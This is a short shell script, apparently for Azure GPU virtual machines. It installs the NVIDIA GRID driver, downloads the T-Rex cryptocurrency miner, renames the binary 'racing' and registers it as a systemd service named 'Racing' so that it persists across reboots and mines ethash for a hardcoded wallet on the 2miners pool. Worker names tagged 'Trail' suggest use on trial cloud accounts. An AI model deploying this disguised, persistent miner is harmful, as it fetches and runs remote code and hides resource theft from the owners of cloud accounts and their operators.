cd /home
myworker=$(date +'%d%m_%H%M%S_Trail_')
myip="$(dig +short myip.opendns.com @resolver1.opendns.com)"
myworker+=$myip
sudo apt-get install linux-headers-$(uname -r) -y
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
sudo apt install build-essential -y
wget https://download.microsoft.com/download/4/3/9/439aea00-a02d-4875-8712-d1ab46cf6a73/NVIDIA-Linux-x86_64-510.47.03-grid-azure.run
sudo chmod +x NVIDIA-Linux-x86_64-510.47.03-grid-azure.run
yes "" | sudo ./NVIDIA-Linux-x86_64-510.47.03-grid-azure.run
wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz  
tar -zxvf t-rex-0.22.1-linux.tar.gz
mv t-rex racing
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w ${myworker}_re_Trail_\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service
./racing -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w $myworker &
